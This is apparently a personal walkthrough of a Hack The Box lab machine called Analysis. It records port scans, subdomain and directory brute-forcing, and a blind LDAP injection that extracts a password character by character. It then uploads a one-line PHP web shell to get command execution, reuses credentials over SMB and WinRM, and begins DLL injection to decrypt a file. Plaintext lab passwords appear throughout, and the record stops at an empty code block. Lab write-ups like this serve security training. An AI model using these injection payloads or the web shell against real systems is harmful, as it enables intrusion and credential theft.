# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.230.179 --generate-hosts-file /etc/hosts        
 
SMB         10.129.230.179  445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc-analysis.analysis.htb -vv 

Host is up, received user-set (0.014s latency).
rDNS record for 10.129.230.179: DC-ANALYSIS.analysis.htb
Scanned at 2026-11-11 17:42:36 GMT for 12s
Not shown: 65506 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3306/tcp  open  mysql            syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
33060/tcp open  mysqlx           syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49682/tcp open  unknown          syn-ack
49691/tcp open  unknown          syn-ack
49702/tcp open  unknown          syn-ack
49715/tcp open  unknown          syn-ack
49717/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060 -A --min-rate=2000 -sT -Pn dc-analysis.analysis.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-11 17:44 +0000
Nmap scan report for dc-analysis.analysis.htb (10.129.230.179)
Host is up (0.014s latency).
rDNS record for 10.129.230.179: DC-ANALYSIS.analysis.htb

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-11 17:44:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx        MySQL X protocol listener
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Kerberos (88)

Ill leave kerbrute running to try and enumerate some users

# SMB (445)
Null auth is enabled but cannot do anything with it

Guest account doesnt even exist judging by the error

# HTTP (80)

![](Pasted%20image%2020261111181649.png)

This is the website, it is completely static with none of the links going anywhere

## Subdomains

```python
❯❯❯ ffuf -u http://analysis.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.analysis.htb' -ic -c -t 30 -ac -mc all

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 16ms]
```

Visiting this page shows a 403

## Feroxbuster on subdomain

```python
❯❯❯ feroxbuster -u http://internal.analysis.htb/ -C 404 --dont-filter                                                                                        
                                                                                                                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.analysis.htb/
 🚩  In-Scope Url          │ internal.analysis.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       29l       93w     1284c http://internal.analysis.htb/
301      GET        2l       10w      170c http://internal.analysis.htb/users => http://internal.analysis.htb/users/
301      GET        2l       10w      174c http://internal.analysis.htb/dashboard => http://internal.analysis.htb/dashboard/
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/js => http://internal.analysis.htb/dashboard/js/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/css => http://internal.analysis.htb/dashboard/css/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img => http://internal.analysis.htb/dashboard/img/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib => http://internal.analysis.htb/dashboard/lib/
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads => http://internal.analysis.htb/dashboard/uploads/
301      GET        2l       10w      170c http://internal.analysis.htb/Users => http://internal.analysis.htb/Users/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/CSS => http://internal.analysis.htb/dashboard/CSS/
301      GET        2l       10w      174c http://internal.analysis.htb/employees => http://internal.analysis.htb/employees/
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/JS => http://internal.analysis.htb/dashboard/JS/
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/Uploads => http://internal.analysis.htb/dashboard/Uploads/
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/Js => http://internal.analysis.htb/dashboard/Js/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/Css => http://internal.analysis.htb/dashboard/Css/
```

Looks like this has found some interesting endpoints

Using the `-x php` in the command now shows some interesting endpoints

```python
403      GET       29l       93w     1284c http://internal.analysis.htb/
301      GET        2l       10w      170c http://internal.analysis.htb/users => http://internal.analysis.htb/users/
200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php
301      GET        2l       10w      174c http://internal.analysis.htb/dashboard => http://internal.analysis.htb/dashboard/
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/js => http://internal.analysis.htb/dashboard/js/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/css => http://internal.analysis.htb/dashboard/css/
302      GET        1l        1w        3c http://internal.analysis.htb/dashboard/logout.php => ../employees/login.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img => http://internal.analysis.htb/dashboard/img/
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads => http://internal.analysis.htb/dashboard/uploads/
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/upload.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib => http://internal.analysis.htb/dashboard/lib/
200      GET        4l        5w       38c http://internal.analysis.htb/dashboard/index.php
301      GET        2l       10w      170c http://internal.analysis.htb/Users => http://internal.analysis.htb/Users/
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/CSS => http://internal.analysis.htb/dashboard/CSS/
200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/form.php
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/JS => http://internal.analysis.htb/dashboard/JS/
301      GET        2l       10w      174c http://internal.analysis.htb/employees => http://internal.analysis.htb/employees/
301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/Uploads => http://internal.analysis.htb/dashboard/Uploads/
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
200      GET        1l        2w       17c http://internal.analysis.htb/Users/list.php
200      GET       30l       60w     1085c http://internal.analysis.htb/employees/Login.php
301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/Js => http://internal.analysis.htb/dashboard/Js/
200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/Upload.php
301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/Css => http://internal.analysis.htb/dashboard/Css/
```

![](Pasted%20image%2020261111182930.png)

This page looks interesting

However after some testing theres nothing i can do here

# LDAP injection 

![](Pasted%20image%2020261111185406.png)

There is also this endpoint which expects a parameter to be passed

```python
❯❯❯ ffuf -u http://internal.analysis.htb/users/list.php?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 35ms]
:: Progress: [12334/12334] :: Job [1/1] :: 2531 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Ill use ffuf to find this parameter value

![](Pasted%20image%2020261111185829.png)

This looks like its pulling from LDAP

![](Pasted%20image%2020261111190309.png)

Using `*` confirms this

This query shows the only users whos name begins with `a`

To test this ill make a list of characters including lowercase, uppercase, numbers and symbols for the event i need to pull out a password

```python
❯❯❯ ffuf -u http://internal.analysis.htb/users/list.php?name=FUZZ* -w chars.txt -fs 406

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=FUZZ*
 :: Wordlist         : FUZZ: /home/kali/htb/analysis/chars.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 406
________________________________________________

j                       [Status: 200, Size: 416, Words: 11, Lines: 1, Duration: 17ms]
b                       [Status: 200, Size: 412, Words: 11, Lines: 1, Duration: 42ms]
l                       [Status: 200, Size: 409, Words: 11, Lines: 1, Duration: 52ms]
t                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 58ms]
a                       [Status: 200, Size: 417, Words: 11, Lines: 1, Duration: 58ms]
```

Judging by the different response length these are valid first characters for usernames

```python
jdoe@analysis.htb
ajohnson@analysis.htb
cwilliams@analysis.htb
wsmith@analysis.htb
jangel@analysis.htb
technician@analysis.htb
badam@analysis.htb
```

But kerbrute also found these users

This leaves only the letter `l` without a username

![](Pasted%20image%2020261111191132.png)

But putting it into the paramter i get the user

```python
❯❯❯ ffuf -u 'http://internal.analysis.htb/users/list.php?name=*)(description=FUZZ*' -w chars.txt
```

After running this command i get a few different response sizes `406,418,8` however there is only multiple 406s and a few 8s

```python
❯❯❯ ffuf -u 'http://internal.analysis.htb/users/list.php?name=*)(description=FUZZ*' -w chars.txt -fs 406,8

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=*)(description=FUZZ*
 :: Wordlist         : FUZZ: /home/kali/htb/analysis/chars.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 406,8
________________________________________________

                        [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 33ms]
9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 94ms]
:: Progress: [94/94] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

And i get a 9

![](Pasted%20image%2020261111192812.png)

And if i put this into a browser i see a different result.....

![](Pasted%20image%2020261111192837.png)

This shows me 9 exists in the first character in the description field of `technician`

Ill keep running ffuf for this but every new character found will be placed before `FUZZ*`

![](Pasted%20image%2020261111193332.png)

And this is the complete password, i know this since it no longer requires the `*` to return the technician account

# Domain user compromise

```python
❯❯❯ nxc smb dc-analysis.analysis.htb -u 'technician' -p '97NTtl*4QP96Bv'
SMB         10.129.230.179  445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv
```

This password also works on the domain

```python
❯❯❯ nxc smb dc-analysis.analysis.htb -u 'technician' -p '97NTtl*4QP96Bv' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrateur
Invité
krbtgt
DC-ANALYSIS$
jdoe
soc_analyst
cwilliams
technician
webservice
wsmith
jangel
lzen
svc_web
amanson
badam
```

Ill grab all the users to make sure i didnt miss any

I now understand why the guest account did not work, this is becuase the box was made by a french person so the guest account is `Invité`

# Remote code execution

The creds also get me access to the web portal as the technician

```python
❯❯❯ cat phpshell.php     
<?php system($_REQUEST['cmd']); ?>
```

There is a section to upload files, ill try a PHP web shell

![](Pasted%20image%2020261111195959.png)

After running feroxbuster earlier i found the uploads endpoint so i made a safe assumption it would store there

And now i have RCE

![](Pasted%20image%2020261111200244.png)

And using a powershell base64 encoded rev shell i can get a shell simply by placing in inside `?cmd=`

# Compromising `jdoe`

![](Pasted%20image%2020261112164445.png)

Going through the logs i find a password for the user `jdoe`

```python
jdoe:7y4Z4^*y9Zzj
```

```python
❯❯❯ nxc smb dc-analysis.analysis.htb -u 'jdoe' -p '7y4Z4^*y9Zzj'  
SMB         10.129.230.179  445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj 
```

`%5E` -> `^`

I now have successful auth as the `jdoe` user

# Winrm access as `jdoe`

```python
❯❯❯ nxc winrm dc-analysis.analysis.htb -u 'jdoe' -p '7y4Z4^*y9Zzj'
WINRM       10.129.230.179  5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb) 
WINRM       10.129.230.179  5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)
```

This user can WINRM

```python
❯❯❯ python3 venv/bin/evil-winrm-py -i dc-analysis.analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to 'dc-analysis.analysis.htb:5985' as 'jdoe'
evil-winrm-py PS C:\Users\jdoe\Documents>
```

There is a known bug at the time of making this with one of the dependencies of evil-winrm-py the newest version does not work with the newest evil-winrm-py version so i had to setup a virtual environment and get the older version of the dependency and the newest evil-winrm-py version

# Decrypting credentials 

```python
evil-winrm-py PS C:\private> dir


    Directory: C:\private


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        5/26/2023   9:44 AM            576 encoded.txt                                                            


evil-winrm-py PS C:\private>
```

There is an interesting txt file

```python
evil-winrm-py PS C:\private> type encoded.txt
-----BEGIN ENCODED MESSAGE-----
Version: BCTextEncoder Utility v. 1.03.2.1

wy4ECQMCq0jPQTxt+3BgTzQTBPQFbt5KnV7LgBq6vcKWtbdKAf59hbw0KGN9lBIK
0kcBSYXfHU2s7xsWA3pCtjthI0lge3SyLOMw9T81CPqT3HOIKkh3SVcO9jdrxfwu
pHnjX+5HyybuBwIQwGprgyWdGnyv3mfcQQ==
=a7bc
-----END ENCODED MESSAGE-----
evil-winrm-py PS C:\private>
```

https://github.com/player23-0/BCTextEncoder_DLL_injection

Ill download the dll and the exe to my machine and upload them both through the winrm session

```python
evil-winrm-py PS C:\Users\jdoe\Documents> Get-Process TextEncode | Select-Object Id, ProcessName

  Id ProcessName
  -- -----------
1044 TextEncode 
6920 TextEncode 


evil-winrm-py PS C:\Users\jdoe\Documents
```

I need to inject into both of these processess

```python

```